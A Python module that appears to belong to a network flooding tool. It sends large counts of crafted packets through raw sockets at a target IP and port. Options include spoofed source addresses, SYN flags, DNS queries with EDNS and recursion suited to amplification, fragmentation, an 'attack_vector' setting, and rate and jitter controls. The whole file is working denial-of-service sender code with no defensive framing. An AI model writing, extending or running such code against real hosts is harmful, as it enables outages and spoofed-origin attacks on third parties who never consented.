import asyncio
import logging
import random
import socket
import traceback


async def send_packet_async(
    packet,
    verbose,
    packet_no,
    loop,
    protocol,
    *,
    scapy_getter,
    ScapyUnavailableError,
):
    """Asynchronously send a packet using scapy in a thread executor."""
    del protocol

    def send_pkt(pkt):
        try:
            scapy = scapy_getter()
            iface = scapy.get_working_if()
            if pkt.haslayer("Ether"):
                scapy.sendp(pkt, iface=iface, realtime=True, verbose=False, return_packets=False)
            else:
                # L3 send should rely on OS routing, specifying iface can cause ARP issues
                scapy.send(pkt, realtime=True, verbose=False, return_packets=False)
            return True
        except ScapyUnavailableError:
            logging.error("Scapy is unavailable; cannot send packets in CPU/Scapy mode.")
            return False
        except Exception:
            logging.error(f"Packet send error for packet {packet_no}:\n{traceback.format_exc()}")
            return False

    result = await loop.run_in_executor(None, send_pkt, packet)

    if result and verbose:
        logging.info(f"Packet {packet_no} sent.")
    elif not result:
        logging.error(f"Packet {packet_no} failed to send.")

    return result


async def packet_sender(
    packet_config,
    count,
    delay=0.0,
    rps=0.0,
    jitter=0.0,
    ramp=0.0,
    verbose=False,
    live_sent=None,
    live_errors=None,
    live_progress=None,
    *,
    scapy_getter,
    stats_fn,
    update_live_fn,
    log_error,
    cpu_packet_engine,
    packet_utils,
    ScapyUnavailableError,
):
    """
    Sends packets based on the provided configuration.
    Uses the zero-dependency CPU Packet Engine for fast packet generation,
    then sends via raw socket. Falls back to Scapy only if the engine fails.
    """
    del ramp
    loop = asyncio.get_running_loop()
    sent_ok = 0
    send_err = 0
    packet_no = 0

    # Build a cpu_packet_engine.PacketConfig from the Scapy-compat config
    try:
        spoof_opts = None
        if hasattr(packet_config, "spoof_opts") and packet_config.spoof_opts:
            spoof_opts = cpu_packet_engine.SpoofingOptions(
                mode=getattr(packet_config.spoof_opts, "mode", "realistic"),
                subnet=getattr(packet_config.spoof_opts, "subnet", None),
                list_file=getattr(packet_config.spoof_opts, "list_file", None),
            )

        engine_cfg = cpu_packet_engine.PacketConfig(
            target_ip=packet_config.target_ip,
            target_port=packet_config.target_port,
            protocol=getattr(packet_config, "protocol", "tcp"),
            spoof=getattr(packet_config, "spoof", False),
            spoof_opts=spoof_opts,
            payload=getattr(packet_config, "payload", None),
            tcp_flags=getattr(packet_config, "tcp_flags", "S"),
            ttl=getattr(packet_config, "ttl", None),
            tos=getattr(packet_config, "tos", None),
            window=getattr(packet_config, "window", None),
            fragment_enabled=getattr(packet_config, "fragment_enabled", False),
            fragment_size=getattr(packet_config, "fragment_size", 800),
            pad_size=getattr(packet_config, "pad_size", 0),
            attack_vector=getattr(packet_config, "attack_vector", "basic"),
            dns_name=getattr(packet_config, "dns_name", "example.com"),
            dns_qtype=getattr(packet_config, "dns_qtype", "A"),
            dns_edns=getattr(packet_config, "dns_edns", False),
            dns_recursive=getattr(packet_config, "dns_recursive", True),
        )
        use_cpu_engine = True
    except Exception as e:
        log_error(f"CPU Packet Engine config failed, falling back to Scapy: {e}")
        use_cpu_engine = False

    if use_cpu_engine:
        # Fast path: raw socket + CPU engine
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log_error("Raw socket creation failed. Please run with sudo/root.")
            return stats_fn(attempted=count, sent=0, errors=count)
        except Exception as e:
            log_error(f"Failed to create raw socket: {e}")
            return stats_fn(attempted=count, sent=0, errors=count)

        BATCH_SIZE = 256
        dst_addr = (engine_cfg.target_ip, 0)
        sent_ok_snapshot = 0
        send_err_snapshot = 0
        pkt_bytes = b""

        try:
            for i in range(count):
                pkt_bytes = cpu_packet_engine.create_packet(engine_cfg)

                if engine_cfg.fragment_enabled:
                    fragments = cpu_packet_engine.fragment_packet(
                        pkt_bytes,
                        fragment_size=max(8, engine_cfg.fragment_size),
                    )
                else:
                    fragments = [pkt_bytes]

                for frag in fragments:
                    packet_no += 1
                    try:
                        sock.sendto(frag, dst_addr)
                        sent_ok += 1
                    except Exception:
                        send_err += 1

                update_live_fn(live_progress, 1)

                base_delay = 0.0
                if rps and rps > 0:
                    base_delay = 1.0 / float(rps)
                elif delay and delay > 0:
                    base_delay = float(delay)

                if base_delay > 0:
                    if jitter and jitter > 0:
                        j = base_delay * float(jitter)
                        await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
                    else:
                        await asyncio.sleep(base_delay)

                if (i + 1) % BATCH_SIZE == 0:
                    update_live_fn(live_sent, sent_ok - sent_ok_snapshot)
                    update_live_fn(live_errors, send_err - send_err_snapshot)
                    sent_ok_snapshot = sent_ok
                    send_err_snapshot = send_err
                    await asyncio.sleep(0)

        except KeyboardInterrupt:
            pass
        finally:
            sock.close()

        update_live_fn(live_sent, sent_ok - sent_ok_snapshot)
        update_live_fn(live_errors, send_err - send_err_snapshot)

        return stats_fn(
            attempted=packet_no,
            sent=sent_ok,
            errors=max(0, packet_no - sent_ok) if send_err <= 0 else send_err,
            bytes_sent_est=sent_ok * len(pkt_bytes) if count > 0 else 0,
        )

    # Scapy fallback path
    try:
        scapy = scapy_getter()
    except ScapyUnavailableError:
        log_error("Both CPU Engine and Scapy unavailable; packet_sender cannot run.")
        return stats_fn(attempted=count, sent=0, errors=count)

    tasks = []
    MAX_INFLIGHT_TASKS = 1024

    async def _flush():
        nonlocal sent_ok, send_err
        if not tasks:
            return
        results = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        batch_sent = sum(1 for r in results if r is True)
        batch_err = len(results) - batch_sent
        sent_ok += batch_sent
        send_err += batch_err
        update_live_fn(live_sent, batch_sent)
        update_live_fn(live_errors, batch_err)

    for i in range(count):
        pkt = packet_utils.create_packet(packet_config)
        pkts_to_send = [pkt]

        if getattr(packet_config, "fragment_enabled", False):
            frag_size = int(getattr(packet_config, "fragment_size", 800) or 800)
            frag_size = max(8, frag_size)
            try:
                pkts_to_send = scapy.fragment(pkt, fragsize=frag_size)
            except Exception:
                pkts_to_send = [pkt]

        for p in pkts_to_send:
            packet_no += 1
            update_live_fn(live_progress, 1)
            tasks.append(
                loop.create_task(
                    send_packet_async(
                        p,
                        verbose,
                        packet_no,
                        loop,
                        packet_config.protocol,
                        scapy_getter=scapy_getter,
                        ScapyUnavailableError=ScapyUnavailableError,
                    )
                )
            )
            if len(tasks) >= MAX_INFLIGHT_TASKS:
                await _flush()

        base_delay = 0.0
        if rps and rps > 0:
            base_delay = 1.0 / float(rps)
        elif delay and delay > 0:
            base_delay = float(delay)

        if base_delay > 0:
            if jitter and jitter > 0:
                j = base_delay * float(jitter)
                await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
            else:
                await asyncio.sleep(base_delay)

    if tasks:
        await _flush()
    return stats_fn(
        attempted=packet_no,
        sent=sent_ok,
        errors=max(0, packet_no - sent_ok) if send_err <= 0 else send_err,
    )

